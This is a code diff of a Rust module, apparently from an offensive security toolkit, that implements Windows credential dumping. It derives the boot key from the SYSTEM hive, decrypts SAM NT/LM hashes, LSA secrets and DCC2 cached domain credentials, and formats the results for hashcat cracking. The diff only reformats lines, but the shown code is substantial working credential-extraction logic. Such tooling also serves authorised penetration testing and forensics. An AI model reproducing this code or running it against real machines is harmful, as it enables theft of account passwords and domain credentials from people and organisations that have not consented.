@@ -7,7 +7,7 @@
 //! - NTDS.dit extraction via DRSUAPI (domain account hashes)
 //! - DCC2 cached domain credentials
 
-use anyhow::{anyhow, Result};
+use anyhow::{Result, anyhow};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 
@@ -161,14 +161,15 @@ pub fn dump_dcc2(security_data: &[u8], system_data: &[u8]) -> Result<Vec<Dcc2Cre
 
     for encrypted_entry in &cached_entries {
         if let Ok((username, dcc2_hash)) = decrypt_cached_entry(&nlkm_key, encrypted_entry)
-            && !username.is_empty() {
-                // Format as hashcat mode 2100: $DCC2$10240#username#hash
-                let hash_str = format!("$DCC2$10240#{}#{}", username, hex_encode(&dcc2_hash));
-                credentials.push(Dcc2Credential {
-                    username,
-                    nt_hash: Some(hash_str),
-                });
-            }
+            && !username.is_empty()
+        {
+            // Format as hashcat mode 2100: $DCC2$10240#username#hash
+            let hash_str = format!("$DCC2$10240#{}#{}", username, hex_encode(&dcc2_hash));
+            credentials.push(Dcc2Credential {
+                username,
+                nt_hash: Some(hash_str),
+            });
+        }
     }
 
     Ok(credentials)
@@ -192,7 +193,11 @@ fn validate_hive(data: &[u8], name: &str) -> Result<()> {
 /// Read a little-endian u32 from a byte slice at the given offset
 fn read_u32(data: &[u8], offset: usize) -> Result<u32> {
     if offset + 4 > data.len() {
-        return Err(anyhow!("read_u32: offset {} out of bounds (len {})", offset, data.len()));
+        return Err(anyhow!(
+            "read_u32: offset {} out of bounds (len {})",
+            offset,
+            data.len()
+        ));
     }
     Ok(u32::from_le_bytes([
         data[offset],
@@ -205,7 +210,11 @@ fn read_u32(data: &[u8], offset: usize) -> Result<u32> {
 /// Read a little-endian u16 from a byte slice at the given offset
 fn read_u16(data: &[u8], offset: usize) -> Result<u16> {
     if offset + 2 > data.len() {
-        return Err(anyhow!("read_u16: offset {} out of bounds (len {})", offset, data.len()));
+        return Err(anyhow!(
+            "read_u16: offset {} out of bounds (len {})",
+            offset,
+            data.len()
+        ));
     }
     Ok(u16::from_le_bytes([data[offset], data[offset + 1]]))
 }
@@ -274,9 +283,10 @@ fn find_subkey(data: &[u8], nk_offset: usize, name: &str) -> Result<usize> {
                 let child_offset = cell_offset(child_rel);
 
                 if let Ok(child_name) = read_nk_name(data, child_offset)
-                    && child_name.to_lowercase() == name_lower {
-                        return Ok(child_offset);
-                    }
+                    && child_name.to_lowercase() == name_lower
+                {
+                    return Ok(child_offset);
+                }
             }
         }
         // ri (index root) — each entry is 4 bytes: offset to sub-list
@@ -300,9 +310,10 @@ fn find_subkey(data: &[u8], nk_offset: usize, name: &str) -> Result<usize> {
                         let child_rel = read_u32(data, sub_entry)?;
                         let child_offset = cell_offset(child_rel);
                         if let Ok(child_name) = read_nk_name(data, child_offset)
-                            && child_name.to_lowercase() == name_lower {
-                                return Ok(child_offset);
-                            }
+                            && child_name.to_lowercase() == name_lower
+                        {
+                            return Ok(child_offset);
+                        }
                     }
                 }
             }
@@ -317,9 +328,10 @@ fn find_subkey(data: &[u8], nk_offset: usize, name: &str) -> Result<usize> {
                 let child_rel = read_u32(data, entry_offset)?;
                 let child_offset = cell_offset(child_rel);
                 if let Ok(child_name) = read_nk_name(data, child_offset)
-                    && child_name.to_lowercase() == name_lower {
-                        return Ok(child_offset);
-                    }
+                    && child_name.to_lowercase() == name_lower
+                {
+                    return Ok(child_offset);
+                }
             }
         }
         _ => {
@@ -407,9 +419,7 @@ fn read_value(data: &[u8], nk_offset: usize, value_name: &str) -> Result<Vec<u8>
             continue;
         };
 
-        if vk_name.to_lowercase() == name_lower
-            || (value_name.is_empty() && vk_name_len == 0)
-        {
+        if vk_name.to_lowercase() == name_lower || (value_name.is_empty() && vk_name_len == 0) {
             // Data might be inline (if high bit of data_len is set and len <= 4)
             let real_len = vk_data_len & 0x7FFFFFFF;
             if vk_data_len & 0x80000000 != 0 && real_len <= 4 {
@@ -527,7 +537,12 @@ fn extract_boot_key(system_data: &[u8]) -> Result<[u8; 16]> {
     let select_key = navigate_path(system_data, &["Select"])?;
     let current_value = read_value(system_data, select_key, "Current")?;
     let current_cs = if current_value.len() >= 4 {
-        u32::from_le_bytes([current_value[0], current_value[1], current_value[2], current_value[3]])
+        u32::from_le_bytes([
+            current_value[0],
+            current_value[1],
+            current_value[2],
+            current_value[3],
+        ])
     } else {
         1 // default to ControlSet001
     };
@@ -561,8 +576,7 @@ fn extract_boot_key(system_data: &[u8]) -> Result<[u8; 16]> {
 
     // Unscramble the boot key using the permutation table
     const PERM: [usize; 16] = [
-        0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3,
-        0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
+        0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
     ];
 
     let mut boot_key = [0u8; 16];
@@ -603,10 +617,7 @@ fn hex_str_to_bytes(hex: &str) -> Result<Vec<u8>> {
     }
     (0..hex.len())
         .step_by(2)
-        .map(|i| {
-            u8::from_str_radix(&hex[i..i + 2], 16)
-                .map_err(|e| anyhow!("invalid hex: {}", e))
-        })
+        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).map_err(|e| anyhow!("invalid hex: {}", e)))
         .collect()
 }
 
@@ -660,8 +671,11 @@ fn extract_username_from_v(v_data: &[u8]) -> Option<String> {
         return None;
     }
 
-    let name_offset = u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]]) as usize + 0xCC;
-    let name_len = u32::from_le_bytes([v_data[0x10], v_data[0x11], v_data[0x12], v_data[0x13]]) as usize;
+    let name_offset = u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]])
+        as usize
+        + 0xCC;
+    let name_len =
+        u32::from_le_bytes([v_data[0x10], v_data[0x11], v_data[0x12], v_data[0x13]]) as usize;
 
     if name_offset + name_len > v_data.len() || name_len == 0 {
         return None;
@@ -689,11 +703,17 @@ fn decrypt_sam_hash(boot_key: &[u8; 16], rid: u32, v_data: &[u8]) -> Result<(Vec
         return Err(anyhow!("V value too short ({} bytes)", v_data.len()));
     }
 
-    let nt_offset = u32::from_le_bytes([v_data[0xA8], v_data[0xA9], v_data[0xAA], v_data[0xAB]]) as usize + 0xCC;
-    let nt_len = u32::from_le_bytes([v_data[0xAC], v_data[0xAD], v_data[0xAE], v_data[0xAF]]) as usize;
+    let nt_offset = u32::from_le_bytes([v_data[0xA8], v_data[0xA9], v_data[0xAA], v_data[0xAB]])
+        as usize
+        + 0xCC;
+    let nt_len =
+        u32::from_le_bytes([v_data[0xAC], v_data[0xAD], v_data[0xAE], v_data[0xAF]]) as usize;
 
-    let lm_offset = u32::from_le_bytes([v_data[0x9C], v_data[0x9D], v_data[0x9E], v_data[0x9F]]) as usize + 0xCC;
-    let lm_len = u32::from_le_bytes([v_data[0xA0], v_data[0xA1], v_data[0xA2], v_data[0xA3]]) as usize;
+    let lm_offset = u32::from_le_bytes([v_data[0x9C], v_data[0x9D], v_data[0x9E], v_data[0x9F]])
+        as usize
+        + 0xCC;
+    let lm_len =
+        u32::from_le_bytes([v_data[0xA0], v_data[0xA1], v_data[0xA2], v_data[0xA3]]) as usize;
 
     let mut nt_hash = vec![0u8; 16];
     let mut lm_hash = vec![0u8; 16];
@@ -701,7 +721,11 @@ fn decrypt_sam_hash(boot_key: &[u8; 16], rid: u32, v_data: &[u8]) -> Result<(Vec
     // Extract NT hash
     if nt_len >= 20 && nt_offset + nt_len <= v_data.len() {
         let nt_raw = &v_data[nt_offset..nt_offset + nt_len];
-        let revision = if nt_raw.len() > 2 { u16::from_le_bytes([nt_raw[0], nt_raw[1]]) } else { 1 };
+        let revision = if nt_raw.len() > 2 {
+            u16::from_le_bytes([nt_raw[0], nt_raw[1]])
+        } else {
+            1
+        };
 
         if revision == 1 {
             // RC4 + DES double encryption (pre-Vista)
@@ -721,7 +745,11 @@ fn decrypt_sam_hash(boot_key: &[u8; 16], rid: u32, v_data: &[u8]) -> Result<(Vec
     // Extract LM hash
     if lm_len >= 20 && lm_offset + lm_len <= v_data.len() {
         let lm_raw = &v_data[lm_offset..lm_offset + lm_len];
-        let revision = if lm_raw.len() > 2 { u16::from_le_bytes([lm_raw[0], lm_raw[1]]) } else { 1 };
+        let revision = if lm_raw.len() > 2 {
+            u16::from_le_bytes([lm_raw[0], lm_raw[1]])
+        } else {
+            1
+        };
 
         if revision == 1 && lm_raw.len() >= 20 {
             lm_hash = decrypt_sam_hash_rc4(boot_key, rid, &lm_raw[4..20], true)?;
@@ -746,10 +774,7 @@ fn decrypt_sam_hash_rc4(
     // 3. DES two-block decrypt with RID-derived keys
     use crate::crypto::rc4_util;
     let result = rc4_util::decrypt_sam_hash_rc4(
-        rid,
-        boot_key,
-        encrypted,
-        !is_lm, // is_nt = !is_lm
+        rid, boot_key, encrypted, !is_lm, // is_nt = !is_lm
     )?;
     Ok(result.to_vec())
 }
@@ -765,12 +790,7 @@ fn decrypt_sam_hash_aes(
     // 1. AES-128-CBC decrypt with boot_key as key and IV from hash structure
     // 2. DES two-block decrypt with RID-derived keys
     use crate::crypto::aes_cts;
-    let result = aes_cts::decrypt_sam_hash_aes(
-        rid,
-        boot_key,
-        encrypted,
-        iv,
-    )?;
+    let result = aes_cts::decrypt_sam_hash_aes(rid, boot_key, encrypted, iv)?;
     Ok(result.to_vec())
 }
 
@@ -785,17 +805,19 @@ fn derive_lsa_key(security_data: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>> 
 
     // Try Vista+ path first
     if let Ok(eklist_key) = find_subkey(security_data, policy_key, "PolEKList")
-        && let Ok(data) = read_value(security_data, eklist_key, "") {
-            // PolEKList value is encrypted with boot key using AES-256-CFB
-            // Decrypt to get the LSA key
-            return decrypt_pol_eklist(&data, boot_key);
-        }
+        && let Ok(data) = read_value(security_data, eklist_key, "")
+    {
+        // PolEKList value is encrypted with boot key using AES-256-CFB
+        // Decrypt to get the LSA key
+        return decrypt_pol_eklist(&data, boot_key);
+    }
 
     // Fall back to pre-Vista path
     if let Ok(polsec_key) = find_subkey(security_data, policy_key, "PolSecretEncryptionKey")
-        && let Ok(data) = read_value(security_data, polsec_key, "") {
-            return decrypt_pol_secret_key(&data, boot_key);
-        }
+        && let Ok(data) = read_value(security_data, polsec_key, "")
+    {
+        return decrypt_pol_secret_key(&data, boot_key);
+    }
 
     Err(anyhow!("could not derive LSA key"))
 }
@@ -833,9 +855,10 @@ fn enumerate_lsa_secrets(security_data: &[u8]) -> Result<Vec<(String, Vec<u8>)>>
     for (offset, name) in &subkeys {
         // Each secret has CurrVal and OldVal subkeys
         if let Ok(currval_key) = find_subkey(security_data, *offset, "CurrVal")
-            && let Ok(data) = read_value(security_data, currval_key, "") {
-                secrets.push((name.clone(), data));
-            }
+            && let Ok(data) = read_value(security_data, currval_key, "")
+        {
+            secrets.push((name.clone(), data));
+        }
     }
 
     Ok(secrets)
@@ -883,9 +906,10 @@ fn derive_nlkm_key(security_data: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>>
     // NL$KM is stored as an LSA secret
     let secrets_key = navigate_path(security_data, &["Policy", "Secrets", "NL$KM"])?;
     if let Ok(currval_key) = find_subkey(security_data, secrets_key, "CurrVal")
-        && let Ok(data) = read_value(security_data, currval_key, "") {
-            return decrypt_lsa_secret(&lsa_key, &data);
-        }
+        && let Ok(data) = read_value(security_data, currval_key, "")
+    {
+        return decrypt_lsa_secret(&lsa_key, &data);
+    }
 
     Err(anyhow!("NL$KM key not found"))
 }
@@ -1092,7 +1116,9 @@ impl BootKey {
     /// Derive the boot key from SYSTEM hive JD/Skew1/GBG/Data class values
     pub fn from_system_hive(jd: &[u8], skew1: &[u8], gbg: &[u8], data: &[u8]) -> Result<Self> {
         if jd.len() < 2 || skew1.len() < 2 || gbg.len() < 2 || data.len() < 2 {
-            return Err(anyhow!("Invalid SYSTEM hive class data for boot key derivation"));
+            return Err(anyhow!(
+                "Invalid SYSTEM hive class data for boot key derivation"
+            ));
         }
 
         let mut scrambled = Vec::with_capacity(16);
@@ -1102,8 +1128,7 @@ impl BootKey {
         scrambled.resize(16, 0);
 
         const PERM: [usize; 16] = [
-            0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3,
-            0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
+            0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
         ];
 
         let mut key = [0u8; 16];
@@ -1118,7 +1143,12 @@ impl BootKey {
 }
 
 /// Parse a SAM entry into an ExtractedSecret
-pub fn parse_sam_hash(account: &str, rid: u32, lm_bytes: &[u8], nt_bytes: &[u8]) -> ExtractedSecret {
+pub fn parse_sam_hash(
+    account: &str,
+    rid: u32,
+    lm_bytes: &[u8],
+    nt_bytes: &[u8],
+) -> ExtractedSecret {
     let lm_hash = if lm_bytes.iter().all(|&b| b == 0) {
         None
     } else {
@@ -1164,8 +1194,14 @@ pub fn classify_lsa_secret(name: &str) -> &'static str {
 
 /// Format an NTDS hash entry: `domain\user:rid:lm_hash:nt_hash:::`
 pub fn format_ntds_hash(domain: &str, secret: &ExtractedSecret) -> String {
-    let lm = secret.lm_hash.as_deref().unwrap_or("aad3b435b51404eeaad3b435b51404ee");
-    let nt = secret.nt_hash.as_deref().unwrap_or("31d6cfe0d16ae931b73c59d7e0c089c0");
+    let lm = secret
+        .lm_hash
+        .as_deref()
+        .unwrap_or("aad3b435b51404eeaad3b435b51404ee");
+    let nt = secret
+        .nt_hash
+        .as_deref()
+        .unwrap_or("31d6cfe0d16ae931b73c59d7e0c089c0");
     let rid = secret.rid.unwrap_or(0);
     format!("{}\\{}:{}:{}:{}:::", domain, secret.account, rid, lm, nt)
 }
@@ -1174,11 +1210,7 @@ pub fn format_ntds_hash(domain: &str, secret: &ExtractedSecret) -> String {
 pub fn format_for_cracking(secrets: &[ExtractedSecret]) -> Vec<String> {
     secrets
         .iter()
-        .filter_map(|s| {
-            s.nt_hash
-                .as_ref()
-                .map(|nt| format!("{}:{}", s.account, nt))
-        })
+        .filter_map(|s| s.nt_hash.as_ref().map(|nt| format!("{}:{}", s.account, nt)))
         .collect()
 }
 
@@ -1234,9 +1266,18 @@ mod tests {
 
     #[test]
     fn test_lsa_secret_classification() {
-        assert_eq!(classify_lsa_secret("_SC_SqlService"), "Service Account Password");
-        assert_eq!(classify_lsa_secret("$MACHINE.ACC"), "Machine Account Password");
-        assert_eq!(classify_lsa_secret("NL$KM"), "NL$KM — Cached Credentials Encryption Key");
+        assert_eq!(
+            classify_lsa_secret("_SC_SqlService"),
+            "Service Account Password"
+        );
+        assert_eq!(
+            classify_lsa_secret("$MACHINE.ACC"),
+            "Machine Account Password"
+        );
+        assert_eq!(
+            classify_lsa_secret("NL$KM"),
+            "NL$KM — Cached Credentials Encryption Key"
+        );
         assert_eq!(classify_lsa_secret("RandomThing"), "Unknown LSA Secret");
     }
 
